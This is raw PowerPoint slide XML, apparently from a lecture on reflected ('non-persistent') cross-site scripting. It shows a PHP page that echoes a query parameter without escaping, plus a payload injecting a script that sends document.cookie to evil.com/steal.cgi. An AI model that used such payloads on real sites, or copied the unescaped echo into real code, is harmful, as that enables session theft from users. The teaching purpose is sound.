                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;title&gt;Search results&lt;/title&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;body&gt;You have searched for &lt;?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t> echo $_GET[term] ?&gt;… &lt;/body&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="Straight Arrow Connector 11"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5080000" y="2305681"/>
            <a:ext cx="1045766" cy="450219"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF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5676900" y="3822187"/>
            <a:ext cx="891406" cy="1676913"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF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H="1" flipV="1">
            <a:off x="2717800" y="3974587"/>
            <a:ext cx="2603500" cy="1435613"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>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44E2DDA0-C455-154A-B81C-2CE3C301435A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="194866" y="3237737"/>
            <a:ext cx="4242252" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>You have searched for &lt;script&gt;XXX&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14003744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Non-Persistent Attacks</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="10" name="Group 9"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="1295621" y="2644888"/>
            <a:ext cx="5795568" cy="1627518"/>
            <a:chOff x="1295621" y="2345956"/>
            <a:chExt cx="5795568" cy="1627518"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="4" name="Picture 3" descr="chromebeatsfiref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621" y="2345956"/>
              <a:ext cx="2293321" cy="1627518"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:pic>
          <p:nvPicPr>
            <p:cNvPr id="5" name="Picture 4" descr="Serve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766" y="2345956"/>
              <a:ext cx="965423" cy="1112691"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
          </p:spPr>
        </p:pic>
        <p:cxnSp>
          <p:nvCxnSpPr>
            <p:cNvPr id="6" name="Straight Arrow Connector 5"/>
            <p:cNvCxnSpPr/>
            <p:nvPr/>
          </p:nvCxnSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="3378200" y="2833059"/>
              <a:ext cx="2747566" cy="177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H="1">
              <a:off x="3378200" y="3302959"/>
              <a:ext cx="274756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8" name="Rectangle 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2239566" y="1936349"/>
            <a:ext cx="3284934" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>GET/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>hello.cgi?name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Bob</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Rectangle 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2974206" y="5499100"/>
            <a:ext cx="3746500" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcBef>
                <a:spcPts val="575"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008000"/>
              </a:buCl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solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;html&gt;Welcome, dear </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Courier New" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Bob</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="008000"/>
                </a:solidFill>
                <a:latin typeface="Arial" charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="12" name="Straight Arrow Connector 11"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5080000" y="2305681"/>
            <a:ext cx="1045766" cy="450219"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF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5676900" y="3822187"/>
            <a:ext cx="891406" cy="1676913"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF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H="1" flipV="1">
            <a:off x="2717800" y="3974587"/>
            <a:ext cx="2603500" cy="1435613"/>
          </a:xfrm>
          <a:prstGeom prst="straightConnector1">
            <a:avLst/>
          </a:prstGeom>
          <a:ln>
            <a:solidFill>
              <a:srgbClr val="FF0000"/>
            </a:solidFill>
            <a:prstDash val="sysDash"/>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06641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charset="0"/>
                <a:cs typeface="Arial" charset="0"/>
              </a:rPr>
              <a:t>Non-Persistent Attacks</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="4" name="Picture 3" descr="images-2.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659" y="1490675"/>
            <a:ext cx="1134395" cy="849701"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="5" name="Picture 4" descr="Serv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1189" y="1314904"/>
            <a:ext cx="965423" cy="1112691"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="6" name="Picture 5" descr="chromebeatsfirefox1.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98267" y="1314904"/>
            <a:ext cx="1444983" cy="1025472"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text Box 15"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1629781" y="2589390"/>
            <a:ext cx="2222942" cy="1103765"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBE0E3"/>
          </a:solidFill>
          <a:ln w="28440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square"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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;FRAME SRC=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>naive.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>hello.cgi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>name=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>win.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>cookie=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>) </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;/script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Text Box 19"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5143250" y="3152903"/>
            <a:ext cx="2514600" cy="755464"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBE0E3"/>
          </a:solidFill>
          <a:ln w="28440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>GET/ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>hello.cgi?</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>win.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>“</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>http://</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>evil.com</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>steal.cgi?cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>+</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1200" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>)&lt;/script&gt;</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text Box 23"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="5157913" y="4545251"/>
            <a:ext cx="2514599" cy="1314450"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="BBE0E3"/>
          </a:solidFill>
          <a:ln w="28440">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:miter lim="800000"/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
        </p:spPr>
        <p:txBody>
          <a:bodyPr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ＭＳ Ｐゴシック" charset="0"/>
                <a:cs typeface="Arial"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5pPr>
            <a:lvl6pPr marL="25146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6pPr>
            <a:lvl7pPr marL="29718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7pPr>
            <a:lvl8pPr marL="34290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8pPr>
            <a:lvl9pPr marL="38862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9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;HTML&gt;Hello, dear</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="70000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="350"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="333399"/>
              </a:buClr>
              <a:buFont typeface="Tahoma" charset="0"/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>&lt;script&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>win.open</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
              </a:rPr>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-GB" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma" charset="0"/>
